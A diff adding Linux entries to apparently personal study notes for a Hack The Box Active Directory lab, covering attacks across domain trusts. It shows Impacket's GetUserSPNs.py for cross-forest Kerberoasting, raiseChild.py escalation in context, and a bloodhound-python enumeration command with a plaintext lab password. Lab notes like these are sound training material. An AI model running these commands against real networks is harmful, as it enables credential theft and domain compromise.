@@ -539,4 +539,15 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 **Admin Password Reuse**
 - Foreign group membership can be found 
 #### Linux 
+```
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+- Foreign group membership with bloodhound-python is possible but requires adding INLANEFREIGHT.LOCAL information to /etc/resolv.conf
+
+```
+cat /etc/resolv.conf
+```
+```
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+```
 
